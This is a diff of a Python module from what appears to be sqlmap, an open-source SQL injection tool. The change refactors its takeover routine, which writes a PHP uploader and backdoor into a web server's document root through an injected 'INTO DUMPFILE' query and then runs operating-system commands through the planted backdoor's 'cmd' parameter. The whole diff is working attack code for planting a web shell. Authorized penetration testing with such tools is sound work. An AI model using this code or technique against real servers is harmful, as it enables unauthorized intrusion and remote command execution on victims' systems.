@@ -24,12 +24,15 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 
 
+import os
 import re
 
-from lib.core.common import getDirectories
+from lib.core.agent import agent
+from lib.core.common import fileToStr
+from lib.core.common import getDirs
+from lib.core.common import getDocRoot
 from lib.core.common import randomStr
 from lib.core.common import readInput
-from lib.core.convert import urlencode
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -59,13 +62,12 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
 
 
     def __webBackdoorRunCmd(self, backdoorUrl, cmd):
-        """
-        TODO: complete review of this code is needed
-        """
-
         output = None
 
-        cmdUrl  = "%s?cmd=%s" % (backdoorUrl, conf.osCmd)
+        if not cmd:
+            cmd = conf.osCmd
+
+        cmdUrl  = "%s?cmd=%s" % (backdoorUrl, cmd)
         page, _ = Request.getPage(url=cmdUrl, direct=True)
         output  = re.search("<pre>(.+?)</pre>", page, re.I | re.S)
 
@@ -79,8 +81,6 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
 
     def __webBackdoorOsShell(self):
         """
-        TODO: complete review of this code is needed
-
         This method is used to write a PHP agent (cmd.php) on a writable
         remote directory within the web server document root.
         Such agent is written using the INTO OUTFILE MySQL DBMS
@@ -95,42 +95,10 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
           ASP, JSP, CGI (Python, Perl, Ruby, Bash).
         """
 
-        infoMsg = "retrieving web application directories"
-        logger.info(infoMsg)
+        self.checkDbmsOs()
 
-        directories = getDirectories()
-
-        if directories:
-            infoMsg  = "retrieved web server directories "
-            infoMsg += "'%s'" % ", ".join(d for d in directories)
-            logger.info(infoMsg)
-
-            message  = "in addition you can provide a list of directories "
-            message += "absolute path comma separated that you want sqlmap "
-            message += "to try to upload the agent [/var/www/test]: "
-            inputDirs = readInput(message, default="/var/www/test")
-        else:
-            message = "please provide the web server document root [/var/www]: "
-            inputDocRoot = readInput(message, default="/var/www")
-
-            if inputDocRoot:
-                kb.docRoot = inputDocRoot
-            else:
-                kb.docRoot = "/var/www"
-
-            message  = "please provide a list of directories absolute path "
-            message += "comma separated that you want sqlmap to try to "
-            message += "upload the agent [/var/www/test]: "
-            inputDirs = readInput(message, default="/var/www/test")
-
-        if inputDirs:
-            inputDirs = inputDirs.replace(", ", ",")
-            inputDirs = inputDirs.split(",")
-
-            for inputDir in inputDirs:
-                directories.add(inputDir)
-        else:
-            directories.add("/var/www/test")
+        kb.docRoot  = getDocRoot()
+        directories = getDirs()
 
         infoMsg = "trying to upload the uploader agent"
         logger.info(infoMsg)
@@ -139,10 +107,17 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
         directories.sort()
         uploaded = False
 
+        # TODO: backdoor and uploader extensions must be the same as of
+        # the web application language in use
         backdoorName = "backdoor.php"
         backdoorPath = "%s/%s" % (paths.SQLMAP_SHELL_PATH, backdoorName)
         uploaderName = "uploader.php"
         uploaderStr  = fileToStr("%s/%s" % (paths.SQLMAP_SHELL_PATH, uploaderName))
+
+        if kb.os == "Windows":
+            sep = "\\\\"
+        else:
+            sep = "/"
 
         for directory in directories:
             if uploaded:
@@ -150,23 +125,22 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
 
             # Upload the uploader agent
             uploaderQuery = uploaderStr.replace("WRITABLE_DIR", directory)
-            query  = " LIMIT 1 INTO OUTFILE '%s/%s' " % (directory, uploaderName)
+            query  = " LIMIT 1 INTO DUMPFILE '%s%s%s' " % (directory, sep, uploaderName)
             query += "LINES TERMINATED BY '\\n%s\\n'--" % uploaderQuery
 
             query = agent.prefixQuery(" %s" % query)
             query = agent.postfixQuery(query)
 
-            payload = agent.payload(newValue=query)
-            page = Request.queryPage(payload)
+            payload     = agent.payload(newValue=query)
+            page        = Request.queryPage(payload)
+            requestDir  = directory.replace(kb.docRoot, "/").replace("\\", "/")
+            requestDir  = os.path.normpath(requestDir)
 
-            if kb.docRoot:
-                requestDir = directory.replace(kb.docRoot, "")
-            else:
-                requestDir = directory
-
-            baseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
+            baseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
             uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
-            page, _ = Request.getPage(url=uploaderUrl, direct=True)
+            uploaderUrl = os.path.normpath(uploaderUrl)
+
+            page, _     = Request.getPage(url=uploaderUrl, direct=True)
 
             if "sqlmap backdoor uploader" not in page:
                 warnMsg  = "unable to upload the uploader "
